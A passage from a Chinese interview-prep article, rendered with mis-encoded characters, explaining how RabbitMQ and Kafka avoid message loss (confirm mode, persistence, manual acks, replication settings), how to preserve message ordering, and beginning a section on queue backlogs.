class="line">    <span class="comment">// è¿™é‡Œå‘é€æ¶ˆæ¯</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    channel.txRollback</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿™é‡Œå†æ¬¡é‡å‘è¿™æ¡æ¶ˆæ¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æäº¤äº‹åŠ¡</span></span><br><span class="line">channel.txCommit</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é—®é¢˜æ˜¯ï¼ŒRabbitMQ äº‹åŠ¡æœºåˆ¶ï¼ˆåŒæ­¥ï¼‰ä¸€æï¼ŒåŸºæœ¬ä¸Š<strong>ååé‡ä¼šä¸‹æ¥ï¼Œå› ä¸ºå¤ªè€—æ€§èƒ½</strong>ã€‚</p><p>æ‰€ä»¥ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœä½ è¦ç¡®ä¿è¯´å†™ RabbitMQ çš„æ¶ˆæ¯åˆ«ä¸¢ï¼Œå¯ä»¥å¼€å¯ <code>confirm</code> æ¨¡å¼ï¼Œåœ¨ç”Ÿäº§è€…é‚£é‡Œè®¾ç½®å¼€å¯ <code>confirm</code> æ¨¡å¼ä¹‹åï¼Œä½ æ¯æ¬¡å†™çš„æ¶ˆæ¯éƒ½ä¼šåˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ idï¼Œç„¶åå¦‚æœå†™å…¥äº† RabbitMQ ä¸­ï¼ŒRabbitMQ ä¼šç»™ä½ å›ä¼ ä¸€ä¸ª <code>ack</code> æ¶ˆæ¯ï¼Œå‘Šè¯‰ä½ è¯´è¿™ä¸ªæ¶ˆæ¯ ok äº†ã€‚å¦‚æœ RabbitMQ æ²¡èƒ½å¤„ç†è¿™ä¸ªæ¶ˆæ¯ï¼Œä¼šå›è°ƒä½ çš„ä¸€ä¸ª <code>nack</code> æ¥å£ï¼Œå‘Šè¯‰ä½ è¿™ä¸ªæ¶ˆæ¯æ¥æ”¶å¤±è´¥ï¼Œä½ å¯ä»¥é‡è¯•ã€‚è€Œä¸”ä½ å¯ä»¥ç»“åˆè¿™ä¸ªæœºåˆ¶è‡ªå·±åœ¨å†…å­˜é‡Œç»´æŠ¤æ¯ä¸ªæ¶ˆæ¯ id çš„çŠ¶æ€ï¼Œå¦‚æœè¶…è¿‡ä¸€å®šæ—¶é—´è¿˜æ²¡æ¥æ”¶åˆ°è¿™ä¸ªæ¶ˆæ¯çš„å›è°ƒï¼Œé‚£ä¹ˆä½ å¯ä»¥é‡å‘ã€‚</p><p>äº‹åŠ¡æœºåˆ¶å’Œ <code>confirm</code> æœºåˆ¶æœ€å¤§çš„ä¸åŒåœ¨äºï¼Œ<strong>äº‹åŠ¡æœºåˆ¶æ˜¯åŒæ­¥çš„</strong>ï¼Œä½ æäº¤ä¸€ä¸ªäº‹åŠ¡ä¹‹åä¼š<strong>é˜»å¡</strong>åœ¨é‚£å„¿ï¼Œä½†æ˜¯ <code>confirm</code> æœºåˆ¶æ˜¯<strong>å¼‚æ­¥</strong>çš„ï¼Œä½ å‘é€ä¸ªæ¶ˆæ¯ä¹‹åå°±å¯ä»¥å‘é€ä¸‹ä¸€ä¸ªæ¶ˆæ¯ï¼Œç„¶åé‚£ä¸ªæ¶ˆæ¯ RabbitMQ æ¥æ”¶äº†ä¹‹åä¼šå¼‚æ­¥å›è°ƒä½ çš„ä¸€ä¸ªæ¥å£é€šçŸ¥ä½ è¿™ä¸ªæ¶ˆæ¯æ¥æ”¶åˆ°äº†ã€‚</p><p>æ‰€ä»¥ä¸€èˆ¬åœ¨ç”Ÿäº§è€…è¿™å—<strong>é¿å…æ•°æ®ä¸¢å¤±</strong>ï¼Œéƒ½æ˜¯ç”¨ <code>confirm</code> æœºåˆ¶çš„ã€‚</p><h4><span id="rabbitmq-å¼„ä¸¢äº†æ•°æ®">RabbitMQ å¼„ä¸¢äº†æ•°æ®</span></h4><p>å°±æ˜¯ RabbitMQ è‡ªå·±å¼„ä¸¢äº†æ•°æ®ï¼Œè¿™ä¸ªä½ å¿…é¡»<strong>å¼€å¯ RabbitMQ çš„æŒä¹…åŒ–</strong>ï¼Œå°±æ˜¯æ¶ˆæ¯å†™å…¥ä¹‹åä¼šæŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œå“ªæ€•æ˜¯ RabbitMQ è‡ªå·±æŒ‚äº†ï¼Œ<strong>æ¢å¤ä¹‹åä¼šè‡ªåŠ¨è¯»å–ä¹‹å‰å­˜å‚¨çš„æ•°æ®</strong>ï¼Œä¸€èˆ¬æ•°æ®ä¸ä¼šä¸¢ã€‚é™¤éæå…¶ç½•è§çš„æ˜¯ï¼ŒRabbitMQ è¿˜æ²¡æŒä¹…åŒ–ï¼Œè‡ªå·±å°±æŒ‚äº†ï¼Œ<strong>å¯èƒ½å¯¼è‡´å°‘é‡æ•°æ®ä¸¢å¤±</strong>ï¼Œä½†æ˜¯è¿™ä¸ªæ¦‚ç‡è¾ƒå°ã€‚</p><p>è®¾ç½®æŒä¹…åŒ–æœ‰<strong>ä¸¤ä¸ªæ­¥éª¤</strong>ï¼š</p><ul><li>åˆ›å»º queue çš„æ—¶å€™å°†å…¶è®¾ç½®ä¸ºæŒä¹…åŒ–<br><br>è¿™æ ·å°±å¯ä»¥ä¿è¯ RabbitMQ æŒä¹…åŒ– queue çš„å…ƒæ•°æ®ï¼Œä½†æ˜¯å®ƒæ˜¯ä¸ä¼šæŒä¹…åŒ– queue é‡Œçš„æ•°æ®çš„ã€‚</li><li>ç¬¬äºŒä¸ªæ˜¯å‘é€æ¶ˆæ¯çš„æ—¶å€™å°†æ¶ˆæ¯çš„ <code>deliveryMode</code> è®¾ç½®ä¸º 2<br><br>å°±æ˜¯å°†æ¶ˆæ¯è®¾ç½®ä¸ºæŒä¹…åŒ–çš„ï¼Œæ­¤æ—¶ RabbitMQ å°±ä¼šå°†æ¶ˆæ¯æŒä¹…åŒ–åˆ°ç£ç›˜ä¸Šå»ã€‚</li></ul><p>å¿…é¡»è¦åŒæ—¶è®¾ç½®è¿™ä¸¤ä¸ªæŒä¹…åŒ–æ‰è¡Œï¼ŒRabbitMQ å“ªæ€•æ˜¯æŒ‚äº†ï¼Œå†æ¬¡é‡å¯ï¼Œä¹Ÿä¼šä»ç£ç›˜ä¸Šé‡å¯æ¢å¤ queueï¼Œæ¢å¤è¿™ä¸ª queue é‡Œçš„æ•°æ®ã€‚</p><p>æ³¨æ„ï¼Œå“ªæ€•æ˜¯ä½ ç»™ RabbitMQ å¼€å¯äº†æŒä¹…åŒ–æœºåˆ¶ï¼Œä¹Ÿæœ‰ä¸€ç§å¯èƒ½ï¼Œå°±æ˜¯è¿™ä¸ªæ¶ˆæ¯å†™åˆ°äº† RabbitMQ ä¸­ï¼Œä½†æ˜¯è¿˜æ²¡æ¥å¾—åŠæŒä¹…åŒ–åˆ°ç£ç›˜ä¸Šï¼Œç»“æœä¸å·§ï¼Œæ­¤æ—¶ RabbitMQ æŒ‚äº†ï¼Œå°±ä¼šå¯¼è‡´å†…å­˜é‡Œçš„ä¸€ç‚¹ç‚¹æ•°æ®ä¸¢å¤±ã€‚</p><p>æ‰€ä»¥ï¼ŒæŒä¹…åŒ–å¯ä»¥è·Ÿç”Ÿäº§è€…é‚£è¾¹çš„ <code>confirm</code> æœºåˆ¶é…åˆèµ·æ¥ï¼Œåªæœ‰æ¶ˆæ¯è¢«æŒä¹…åŒ–åˆ°ç£ç›˜ä¹‹åï¼Œæ‰ä¼šé€šçŸ¥ç”Ÿäº§è€… <code>ack</code> äº†ï¼Œæ‰€ä»¥å“ªæ€•æ˜¯åœ¨æŒä¹…åŒ–åˆ°ç£ç›˜ä¹‹å‰ï¼ŒRabbitMQ æŒ‚äº†ï¼Œæ•°æ®ä¸¢äº†ï¼Œç”Ÿäº§è€…æ”¶ä¸åˆ° <code>ack</code>ï¼Œä½ ä¹Ÿæ˜¯å¯ä»¥è‡ªå·±é‡å‘çš„ã€‚</p><h4><span id="æ¶ˆè´¹ç«¯å¼„ä¸¢äº†æ•°æ®">æ¶ˆè´¹ç«¯å¼„ä¸¢äº†æ•°æ®</span></h4><p>RabbitMQ å¦‚æœä¸¢å¤±äº†æ•°æ®ï¼Œä¸»è¦æ˜¯å› ä¸ºä½ æ¶ˆè´¹çš„æ—¶å€™ï¼Œ<strong>åˆšæ¶ˆè´¹åˆ°ï¼Œè¿˜æ²¡å¤„ç†ï¼Œç»“æœè¿›ç¨‹æŒ‚äº†</strong>ï¼Œæ¯”å¦‚é‡å¯äº†ï¼Œé‚£ä¹ˆå°±å°´å°¬äº†ï¼ŒRabbitMQ è®¤ä¸ºä½ éƒ½æ¶ˆè´¹äº†ï¼Œè¿™æ•°æ®å°±ä¸¢äº†ã€‚</p><p>è¿™ä¸ªæ—¶å€™å¾—ç”¨ RabbitMQ æä¾›çš„ <code>ack</code> æœºåˆ¶ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä½ å¿…é¡»å…³é—­ RabbitMQ çš„è‡ªåŠ¨ <code>ack</code>ï¼Œå¯ä»¥é€šè¿‡ä¸€ä¸ª api æ¥è°ƒç”¨å°±è¡Œï¼Œç„¶åæ¯æ¬¡ä½ è‡ªå·±ä»£ç é‡Œç¡®ä¿å¤„ç†å®Œçš„æ—¶å€™ï¼Œå†åœ¨ç¨‹åºé‡Œ <code>ack</code> ä¸€æŠŠã€‚è¿™æ ·çš„è¯ï¼Œå¦‚æœä½ è¿˜æ²¡å¤„ç†å®Œï¼Œä¸å°±æ²¡æœ‰ <code>ack</code> äº†ï¼Ÿé‚£ RabbitMQ å°±è®¤ä¸ºä½ è¿˜æ²¡å¤„ç†å®Œï¼Œè¿™ä¸ªæ—¶å€™ RabbitMQ ä¼šæŠŠè¿™ä¸ªæ¶ˆè´¹åˆ†é…ç»™åˆ«çš„ consumer å»å¤„ç†ï¼Œæ¶ˆæ¯æ˜¯ä¸ä¼šä¸¢çš„ã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/rabbitmq-message-lose-solution.png" alt="rabbitmq-message-lose-solution"></p><h3><span id="kafka">Kafka</span></h3><h4><span id="æ¶ˆè´¹ç«¯å¼„ä¸¢äº†æ•°æ®">æ¶ˆè´¹ç«¯å¼„ä¸¢äº†æ•°æ®</span></h4><p>å”¯ä¸€å¯èƒ½å¯¼è‡´æ¶ˆè´¹è€…å¼„ä¸¢æ•°æ®çš„æƒ…å†µï¼Œå°±æ˜¯è¯´ï¼Œä½ æ¶ˆè´¹åˆ°äº†è¿™ä¸ªæ¶ˆæ¯ï¼Œç„¶åæ¶ˆè´¹è€…é‚£è¾¹<strong>è‡ªåŠ¨æäº¤äº† offset</strong>ï¼Œè®© Kafka ä»¥ä¸ºä½ å·²ç»æ¶ˆè´¹å¥½äº†è¿™ä¸ªæ¶ˆæ¯ï¼Œä½†å…¶å®ä½ æ‰åˆšå‡†å¤‡å¤„ç†è¿™ä¸ªæ¶ˆæ¯ï¼Œä½ è¿˜æ²¡å¤„ç†ï¼Œä½ è‡ªå·±å°±æŒ‚äº†ï¼Œæ­¤æ—¶è¿™æ¡æ¶ˆæ¯å°±ä¸¢å’¯ã€‚</p><p>è¿™ä¸æ˜¯è·Ÿ RabbitMQ å·®ä¸å¤šå—ï¼Œå¤§å®¶éƒ½çŸ¥é“ Kafka ä¼šè‡ªåŠ¨æäº¤ offsetï¼Œé‚£ä¹ˆåªè¦<strong>å…³é—­è‡ªåŠ¨æäº¤</strong> offsetï¼Œåœ¨å¤„ç†å®Œä¹‹åè‡ªå·±æ‰‹åŠ¨æäº¤ offsetï¼Œå°±å¯ä»¥ä¿è¯æ•°æ®ä¸ä¼šä¸¢ã€‚ä½†æ˜¯æ­¤æ—¶ç¡®å®è¿˜æ˜¯<strong>å¯èƒ½ä¼šæœ‰é‡å¤æ¶ˆè´¹</strong>ï¼Œæ¯”å¦‚ä½ åˆšå¤„ç†å®Œï¼Œè¿˜æ²¡æäº¤ offsetï¼Œç»“æœè‡ªå·±æŒ‚äº†ï¼Œæ­¤æ—¶è‚¯å®šä¼šé‡å¤æ¶ˆè´¹ä¸€æ¬¡ï¼Œè‡ªå·±ä¿è¯å¹‚ç­‰æ€§å°±å¥½äº†ã€‚</p><p>ç”Ÿäº§ç¯å¢ƒç¢°åˆ°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¯´æˆ‘ä»¬çš„ Kafka æ¶ˆè´¹è€…æ¶ˆè´¹åˆ°äº†æ•°æ®ä¹‹åæ˜¯å†™åˆ°ä¸€ä¸ªå†…å­˜çš„ queue é‡Œå…ˆç¼“å†²ä¸€ä¸‹ï¼Œç»“æœæœ‰çš„æ—¶å€™ï¼Œä½ åˆšæŠŠæ¶ˆæ¯å†™å…¥å†…å­˜ queueï¼Œç„¶åæ¶ˆè´¹è€…ä¼šè‡ªåŠ¨æäº¤ offsetã€‚ç„¶åæ­¤æ—¶æˆ‘ä»¬é‡å¯äº†ç³»ç»Ÿï¼Œå°±ä¼šå¯¼è‡´å†…å­˜ queue é‡Œè¿˜æ²¡æ¥å¾—åŠå¤„ç†çš„æ•°æ®å°±ä¸¢å¤±äº†ã€‚</p><h4><span id="kafka-å¼„ä¸¢äº†æ•°æ®">Kafka å¼„ä¸¢äº†æ•°æ®</span></h4><p>è¿™å—æ¯”è¾ƒå¸¸è§çš„ä¸€ä¸ªåœºæ™¯ï¼Œå°±æ˜¯ Kafka æŸä¸ª broker å®•æœºï¼Œç„¶åé‡æ–°é€‰ä¸¾ partition çš„ leaderã€‚å¤§å®¶æƒ³æƒ³ï¼Œè¦æ˜¯æ­¤æ—¶å…¶ä»–çš„ follower åˆšå¥½è¿˜æœ‰äº›æ•°æ®æ²¡æœ‰åŒæ­¥ï¼Œç»“æœæ­¤æ—¶ leader æŒ‚äº†ï¼Œç„¶åé€‰ä¸¾æŸä¸ª follower æˆ leader ä¹‹åï¼Œä¸å°±å°‘äº†ä¸€äº›æ•°æ®ï¼Ÿè¿™å°±ä¸¢äº†ä¸€äº›æ•°æ®å•Šã€‚</p><p>ç”Ÿäº§ç¯å¢ƒä¹Ÿé‡åˆ°è¿‡ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯ï¼Œä¹‹å‰ Kafka çš„ leader æœºå™¨å®•æœºäº†ï¼Œå°† follower åˆ‡æ¢ä¸º leader ä¹‹åï¼Œå°±ä¼šå‘ç°è¯´è¿™ä¸ªæ•°æ®å°±ä¸¢äº†ã€‚</p><p>æ‰€ä»¥æ­¤æ—¶ä¸€èˆ¬æ˜¯è¦æ±‚èµ·ç è®¾ç½®å¦‚ä¸‹ 4 ä¸ªå‚æ•°ï¼š</p><ul><li>ç»™ topic è®¾ç½® <code>replication.factor</code> å‚æ•°ï¼šè¿™ä¸ªå€¼å¿…é¡»å¤§äº 1ï¼Œè¦æ±‚æ¯ä¸ª partition å¿…é¡»æœ‰è‡³å°‘ 2 ä¸ªå‰¯æœ¬ã€‚</li><li>åœ¨ Kafka æœåŠ¡ç«¯è®¾ç½® <code>min.insync.replicas</code> å‚æ•°ï¼šè¿™ä¸ªå€¼å¿…é¡»å¤§äº 1ï¼Œè¿™ä¸ªæ˜¯è¦æ±‚ä¸€ä¸ª leader è‡³å°‘æ„ŸçŸ¥åˆ°æœ‰è‡³å°‘ä¸€ä¸ª follower è¿˜è·Ÿè‡ªå·±ä¿æŒè”ç³»ï¼Œæ²¡æ‰é˜Ÿï¼Œè¿™æ ·æ‰èƒ½ç¡®ä¿ leader æŒ‚äº†è¿˜æœ‰ä¸€ä¸ª follower å§ã€‚</li><li>åœ¨ producer ç«¯è®¾ç½® <code>acks=all</code>ï¼šè¿™ä¸ªæ˜¯è¦æ±‚æ¯æ¡æ•°æ®ï¼Œå¿…é¡»æ˜¯<strong>å†™å…¥æ‰€æœ‰ replica ä¹‹åï¼Œæ‰èƒ½è®¤ä¸ºæ˜¯å†™æˆåŠŸäº†</strong>ã€‚</li><li>åœ¨ producer ç«¯è®¾ç½® <code>retries=MAX</code>ï¼ˆå¾ˆå¤§å¾ˆå¤§å¾ˆå¤§çš„ä¸€ä¸ªå€¼ï¼Œæ— é™æ¬¡é‡è¯•çš„æ„æ€ï¼‰ï¼šè¿™ä¸ªæ˜¯<strong>è¦æ±‚ä¸€æ—¦å†™å…¥å¤±è´¥ï¼Œå°±æ— é™é‡è¯•</strong>ï¼Œå¡åœ¨è¿™é‡Œäº†ã€‚</li></ul><p>æˆ‘ä»¬ç”Ÿäº§ç¯å¢ƒå°±æ˜¯æŒ‰ç…§ä¸Šè¿°è¦æ±‚é…ç½®çš„ï¼Œè¿™æ ·é…ç½®ä¹‹åï¼Œè‡³å°‘åœ¨ Kafka broker ç«¯å°±å¯ä»¥ä¿è¯åœ¨ leader æ‰€åœ¨ broker å‘ç”Ÿæ•…éšœï¼Œè¿›è¡Œ leader åˆ‡æ¢æ—¶ï¼Œæ•°æ®ä¸ä¼šä¸¢å¤±ã€‚</p><h4><span id="ç”Ÿäº§è€…ä¼šä¸ä¼šå¼„ä¸¢æ•°æ®">ç”Ÿäº§è€…ä¼šä¸ä¼šå¼„ä¸¢æ•°æ®ï¼Ÿ</span></h4><p>å¦‚æœæŒ‰ç…§ä¸Šè¿°çš„æ€è·¯è®¾ç½®äº† <code>acks=all</code>ï¼Œä¸€å®šä¸ä¼šä¸¢ï¼Œè¦æ±‚æ˜¯ï¼Œä½ çš„ leader æ¥æ”¶åˆ°æ¶ˆæ¯ï¼Œæ‰€æœ‰çš„ follower éƒ½åŒæ­¥åˆ°äº†æ¶ˆæ¯ä¹‹åï¼Œæ‰è®¤ä¸ºæœ¬æ¬¡å†™æˆåŠŸäº†ã€‚å¦‚æœæ²¡æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œç”Ÿäº§è€…ä¼šè‡ªåŠ¨ä¸æ–­çš„é‡è¯•ï¼Œé‡è¯•æ— é™æ¬¡ã€‚</p><h1><span id="å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„é¡ºåºæ€§">å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„é¡ºåºæ€§ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>å…¶å®è¿™ä¸ªä¹Ÿæ˜¯ç”¨ MQ çš„æ—¶å€™å¿…é—®çš„è¯é¢˜ï¼Œç¬¬ä¸€çœ‹çœ‹ä½ äº†ä¸äº†è§£é¡ºåºè¿™ä¸ªäº‹å„¿ï¼Ÿç¬¬äºŒçœ‹çœ‹ä½ æœ‰æ²¡æœ‰åŠæ³•ä¿è¯æ¶ˆæ¯æ˜¯æœ‰é¡ºåºçš„ï¼Ÿè¿™æ˜¯ç”Ÿäº§ç³»ç»Ÿä¸­å¸¸è§çš„é—®é¢˜ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>æˆ‘ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä»¥å‰åšè¿‡ä¸€ä¸ª mysql <code>binlog</code> åŒæ­¥çš„ç³»ç»Ÿï¼Œå‹åŠ›è¿˜æ˜¯éå¸¸å¤§çš„ï¼Œæ—¥åŒæ­¥æ•°æ®è¦è¾¾åˆ°ä¸Šäº¿ï¼Œå°±æ˜¯è¯´æ•°æ®ä»ä¸€ä¸ª mysql åº“åŸå°ä¸åŠ¨åœ°åŒæ­¥åˆ°å¦ä¸€ä¸ª mysql åº“é‡Œé¢å»ï¼ˆmysql -&gt; mysqlï¼‰ã€‚å¸¸è§çš„ä¸€ç‚¹åœ¨äºè¯´æ¯”å¦‚å¤§æ•°æ® teamï¼Œå°±éœ€è¦åŒæ­¥ä¸€ä¸ª mysql åº“è¿‡æ¥ï¼Œå¯¹å…¬å¸çš„ä¸šåŠ¡ç³»ç»Ÿçš„æ•°æ®åšå„ç§å¤æ‚çš„æ“ä½œã€‚</p><p>ä½ åœ¨ mysql é‡Œå¢åˆ æ”¹ä¸€æ¡æ•°æ®ï¼Œå¯¹åº”å‡ºæ¥äº†å¢åˆ æ”¹ 3 æ¡ <code>binlog</code> æ—¥å¿—ï¼Œæ¥ç€è¿™ä¸‰æ¡ <code>binlog</code> å‘é€åˆ° MQ é‡Œé¢ï¼Œå†æ¶ˆè´¹å‡ºæ¥ä¾æ¬¡æ‰§è¡Œï¼Œèµ·ç å¾—ä¿è¯äººå®¶æ˜¯æŒ‰ç…§é¡ºåºæ¥çš„å§ï¼Ÿä¸ç„¶æœ¬æ¥æ˜¯ï¼šå¢åŠ ã€ä¿®æ”¹ã€åˆ é™¤ï¼›ä½ æ„£æ˜¯æ¢äº†é¡ºåºç»™æ‰§è¡Œæˆåˆ é™¤ã€ä¿®æ”¹ã€å¢åŠ ï¼Œä¸å…¨é”™äº†ä¹ˆã€‚</p><p>æœ¬æ¥è¿™ä¸ªæ•°æ®åŒæ­¥è¿‡æ¥ï¼Œåº”è¯¥æœ€åè¿™ä¸ªæ•°æ®è¢«åˆ é™¤äº†ï¼›ç»“æœä½ æé”™äº†è¿™ä¸ªé¡ºåºï¼Œæœ€åè¿™ä¸ªæ•°æ®ä¿ç•™ä¸‹æ¥äº†ï¼Œæ•°æ®åŒæ­¥å°±å‡ºé”™äº†ã€‚</p><p>å…ˆçœ‹çœ‹é¡ºåºä¼šé”™ä¹±çš„ä¿©åœºæ™¯ï¼š</p><ul><li><strong>RabbitMQ</strong>ï¼šä¸€ä¸ª queueï¼Œå¤šä¸ª consumerã€‚æ¯”å¦‚ï¼Œç”Ÿäº§è€…å‘ RabbitMQ é‡Œå‘é€äº†ä¸‰æ¡æ•°æ®ï¼Œé¡ºåºä¾æ¬¡æ˜¯ data1&#x2F;data2&#x2F;data3ï¼Œå‹å…¥çš„æ˜¯ RabbitMQ çš„ä¸€ä¸ªå†…å­˜é˜Ÿåˆ—ã€‚æœ‰ä¸‰ä¸ªæ¶ˆè´¹è€…åˆ†åˆ«ä» MQ ä¸­æ¶ˆè´¹è¿™ä¸‰æ¡æ•°æ®ä¸­çš„ä¸€æ¡ï¼Œç»“æœæ¶ˆè´¹è€…2å…ˆæ‰§è¡Œå®Œæ“ä½œï¼ŒæŠŠ data2 å­˜å…¥æ•°æ®åº“ï¼Œç„¶åæ˜¯ data1&#x2F;data3ã€‚è¿™ä¸æ˜æ˜¾ä¹±äº†ã€‚</li></ul><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/rabbitmq-order-01.png" alt="rabbitmq-order-01"></p><ul><li><strong>Kafka</strong>ï¼šæ¯”å¦‚è¯´æˆ‘ä»¬å»ºäº†ä¸€ä¸ª topicï¼Œæœ‰ä¸‰ä¸ª partitionã€‚ç”Ÿäº§è€…åœ¨å†™çš„æ—¶å€™ï¼Œå…¶å®å¯ä»¥æŒ‡å®šä¸€ä¸ª keyï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬æŒ‡å®šäº†æŸä¸ªè®¢å• id ä½œä¸º keyï¼Œé‚£ä¹ˆè¿™ä¸ªè®¢å•ç›¸å…³çš„æ•°æ®ï¼Œä¸€å®šä¼šè¢«åˆ†å‘åˆ°åŒä¸€ä¸ª partition ä¸­å»ï¼Œè€Œä¸”è¿™ä¸ª partition ä¸­çš„æ•°æ®ä¸€å®šæ˜¯æœ‰é¡ºåºçš„ã€‚<br>æ¶ˆè´¹è€…ä» partition ä¸­å–å‡ºæ¥æ•°æ®çš„æ—¶å€™ï¼Œä¹Ÿä¸€å®šæ˜¯æœ‰é¡ºåºçš„ã€‚åˆ°è¿™é‡Œï¼Œé¡ºåºè¿˜æ˜¯ ok çš„ï¼Œæ²¡æœ‰é”™ä¹±ã€‚æ¥ç€ï¼Œæˆ‘ä»¬åœ¨æ¶ˆè´¹è€…é‡Œå¯èƒ½ä¼šæ<strong>å¤šä¸ªçº¿ç¨‹æ¥å¹¶å‘å¤„ç†æ¶ˆæ¯</strong>ã€‚å› ä¸ºå¦‚æœæ¶ˆè´¹è€…æ˜¯å•çº¿ç¨‹æ¶ˆè´¹å¤„ç†ï¼Œè€Œå¤„ç†æ¯”è¾ƒè€—æ—¶çš„è¯ï¼Œæ¯”å¦‚å¤„ç†ä¸€æ¡æ¶ˆæ¯è€—æ—¶å‡ å msï¼Œé‚£ä¹ˆ 1 ç§’é’Ÿåªèƒ½å¤„ç†å‡ åæ¡æ¶ˆæ¯ï¼Œè¿™ååé‡å¤ªä½äº†ã€‚è€Œå¤šä¸ªçº¿ç¨‹å¹¶å‘è·‘çš„è¯ï¼Œé¡ºåºå¯èƒ½å°±ä¹±æ‰äº†ã€‚</li></ul><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/kafka-order-01.png" alt="kafka-order-01"></p><h3><span id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</span></h3><h4><span id="rabbitmq">RabbitMQ</span></h4><p>æ‹†åˆ†å¤šä¸ª queueï¼Œæ¯ä¸ª queue ä¸€ä¸ª consumerï¼Œå°±æ˜¯å¤šä¸€äº› queue è€Œå·²ï¼Œç¡®å®æ˜¯éº»çƒ¦ç‚¹ï¼›æˆ–è€…å°±ä¸€ä¸ª queue ä½†æ˜¯å¯¹åº”ä¸€ä¸ª consumerï¼Œç„¶åè¿™ä¸ª consumer å†…éƒ¨ç”¨å†…å­˜é˜Ÿåˆ—åšæ’é˜Ÿï¼Œç„¶ååˆ†å‘ç»™åº•å±‚ä¸åŒçš„ worker æ¥å¤„ç†ã€‚<br><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/rabbitmq-order-02.png" alt="rabbitmq-order-02"></p><h4><span id="kafka">Kafka</span></h4><ul><li>ä¸€ä¸ª topicï¼Œä¸€ä¸ª partitionï¼Œä¸€ä¸ª consumerï¼Œå†…éƒ¨å•çº¿ç¨‹æ¶ˆè´¹ï¼Œå•çº¿ç¨‹ååé‡å¤ªä½ï¼Œä¸€èˆ¬ä¸ä¼šç”¨è¿™ä¸ªã€‚</li><li>å†™ N ä¸ªå†…å­˜ queueï¼Œå…·æœ‰ç›¸åŒ key çš„æ•°æ®éƒ½åˆ°åŒä¸€ä¸ªå†…å­˜ queueï¼›ç„¶åå¯¹äº N ä¸ªçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹åˆ†åˆ«æ¶ˆè´¹ä¸€ä¸ªå†…å­˜ queue å³å¯ï¼Œè¿™æ ·å°±èƒ½ä¿è¯é¡ºåºæ€§ã€‚</li></ul><p>!<img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/kafka-order-02.png" alt="kafka-order-02"></p><h1><span id="å¦‚ä½•è§£å†³æ¶ˆæ¯é˜Ÿåˆ—çš„å»¶æ—¶ä»¥åŠè¿‡æœŸå¤±æ•ˆé—®é¢˜æ¶ˆæ¯é˜Ÿåˆ—æ»¡äº†ä»¥åè¯¥æ€ä¹ˆå¤„ç†æœ‰å‡ ç™¾ä¸‡æ¶ˆæ¯æŒç»­ç§¯å‹å‡ å°æ—¶è¯´è¯´æ€ä¹ˆè§£å†³">å¦‚ä½•è§£å†³æ¶ˆæ¯é˜Ÿåˆ—çš„å»¶æ—¶ä»¥åŠè¿‡æœŸå¤±æ•ˆé—®é¢˜ï¼Ÿæ¶ˆæ¯é˜Ÿåˆ—æ»¡äº†ä»¥åè¯¥æ€ä¹ˆå¤„ç†ï¼Ÿæœ‰å‡ ç™¾ä¸‡æ¶ˆæ¯æŒç»­ç§¯å‹å‡ å°æ—¶ï¼Œè¯´è¯´æ€ä¹ˆè§£å†³ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>ä½ çœ‹è¿™é—®æ³•ï¼Œå…¶å®æœ¬è´¨é’ˆå¯¹çš„åœºæ™¯ï¼Œéƒ½æ˜¯è¯´ï¼Œå¯èƒ½ä½ çš„æ¶ˆè´¹ç«¯å‡ºäº†é—®é¢˜ï¼Œä¸æ¶ˆè´¹äº†ï¼›æˆ–è€…æ¶ˆè´¹çš„é€Ÿåº¦æå…¶æ…¢ã€‚æ¥ç€å°±å‘çˆ¹äº†ï¼Œå¯èƒ½ä½ çš„æ¶ˆæ¯é˜Ÿåˆ—é›†ç¾¤çš„ç£ç›˜éƒ½å¿«å†™æ»¡äº†ï¼Œéƒ½æ²¡äººæ¶ˆè´¹ï¼Œè¿™ä¸ªæ—¶å€™æ€ä¹ˆåŠï¼Ÿæˆ–è€…æ˜¯è¿™æ•´ä¸ªå°±ç§¯å‹äº†å‡ ä¸ªå°æ—¶ï¼Œä½ è¿™ä¸ªæ—¶å€™æ€ä¹ˆåŠï¼Ÿæˆ–è€…æ˜¯ä½ ç§¯å‹çš„æ—¶é—´å¤ªé•¿äº†ï¼Œå¯¼è‡´æ¯”å¦‚ RabbitMQ è®¾ç½®äº†æ¶ˆæ¯è¿‡æœŸæ—¶é—´åå°±æ²¡äº†æ€ä¹ˆåŠï¼Ÿ</p><p>æ‰€ä»¥å°±è¿™äº‹å„¿ï¼Œå…¶å®çº¿ä¸ŠæŒºå¸¸è§çš„ï¼Œä¸€èˆ¬ä¸å‡ºï¼Œä¸€å‡ºå°±æ˜¯å¤§ caseã€‚ä¸€èˆ¬å¸¸è§äºï¼Œä¸¾ä¸ªä¾‹å­ï¼Œæ¶ˆè´¹ç«¯æ¯æ¬¡æ¶ˆè´¹ä¹‹åè¦å†™ mysqlï¼Œç»“æœ mysql 